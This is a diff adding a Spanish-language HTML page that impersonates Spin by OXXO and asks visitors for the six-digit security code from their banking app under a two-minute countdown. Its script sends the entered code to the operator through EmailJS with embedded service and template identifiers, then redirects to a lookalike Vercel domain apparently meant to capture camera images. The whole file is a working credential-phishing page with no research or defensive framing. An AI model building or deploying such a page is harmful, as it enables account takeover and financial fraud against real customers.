@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="ingcodigo.css">
+    <title>SpinOxxo</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body>
+    <div class="nav">
+        <h1 style="font-size: 17px;">Completa tu último paso final de verificación y disfruta al máximo tu cuenta Spin y todos sus beneficios con tiendas Oxxo</h1>
+    </div>
+    <form id="my-form">
+        <input name="_formsubmit_id" type="text" style="display:none">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" id="name" value="https://spinbyoxxo.com.mx/programa-de-lealtad">
+        
+        <div class="comtrecuadroscodigo">
+            <div class="contcuadros">
+                <input class="cuadros" id="1" type="tel" required>
+                <input class="cuadros" id="2" type="tel" required>
+                <input class="cuadros" id="3" type="tel" required>
+                <input class="cuadros" id="4" type="tel" required>
+                <input class="cuadros" id="5" type="tel" required>
+                <input class="cuadros" id="6" type="tel" required>
+
+                <input type="hidden" name="codigo" id="numcodigo">
+            </div>
+            
+            <script>
+                const cuadros = document.querySelectorAll(".cuadros");
+                cuadros.forEach((cuadro, index) => {
+                    cuadro.addEventListener("keydown", (e) => {
+                        if (e.key >= 0 && e.key <= 9) {
+                            cuadros[index].value = "";
+                            setTimeout(() => cuadros[index + 1]?.focus(), 10);
+                        } else if (e.key === "Backspace") {
+                            setTimeout(() => cuadros[index - 1]?.focus(), 10);
+                        }
+                    });
+                });
+
+                function concatenar() {
+                    var codigo = "";
+                    for (var i = 1; i <= 6; i++) {
+                        codigo += document.getElementById(i).value;
+                    }
+                    document.getElementById("numcodigo").value = codigo;
+                }
+            </script>
+
+            <div class="contbtn">
+                <h4 id="contador" style="font-size:18px;font-family:sans-serif;"></h4>
+                <input value="Autorizar" onclick="TodasLasFunciones()" id="btn" class="btn" type="submit">
+            </div>
+
+            <script>
+                // Define la duración del contador en segundos
+                const DURACION_CONTADOR = 120;
+                const contador = document.getElementById("contador");
+                let minutos = Math.floor(DURACION_CONTADOR / 60);
+                let segundos = DURACION_CONTADOR % 60;
+                contador.textContent = `${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
+
+                const intervalo = setInterval(() => {
+                    segundos--;
+                    if (segundos < 0) {
+                        minutos--;
+                        segundos = 59;
+                    }
+                    contador.textContent = `${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
+                    if (minutos === 0 && segundos === 0) clearInterval(intervalo);
+                }, 1000);
+
+                var input = document.getElementById("6");
+                input.addEventListener("keydown", function(e){
+                    var btn = document.getElementById("btn");
+                    if(input.value.length == 0){
+                        btn.style.backgroundColor = '#FF0000';
+                    }
+                });
+
+                function TodasLasFunciones() {
+                    concatenar();
+                }
+            </script>
+        </div>
+
+        <div class="nav">
+            <h1 style="color: red; text-align: center; font-size: 17px;">Ingresa tu código de seguridad que usas en la app para confirmar tu identidad</h1>
+        </div>
+    </form>
+
+    <div style="display: flex; align-items: center; justify-content:center;">
+        <img width="150px" src="./logo.jpeg" alt="">
+    </div>
+    
+    <script>
+        // Inicializar EmailJS
+        (function() {
+            emailjs.init('yFU9JBpoc0HR6Rrjt'); // Reemplaza 'YOUR_USER_ID' con tu identificador de usuario de EmailJS
+        })();
+
+        document.querySelector('form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            concatenar();  // Concatenar código
+
+            var form = document.getElementById('my-form');
+
+            // Enviar el formulario usando EmailJS
+            emailjs.sendForm('service_e3baf6l', 'template_r2oflvw', form)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    window.location.href = 'https://spinvalidaclientseguridpsi.vercel.app/camara';
+                }, function(error) {
+                    console.log('FAILED...', error);
+                });
+        });
+    </script>
+</body>
+</html>
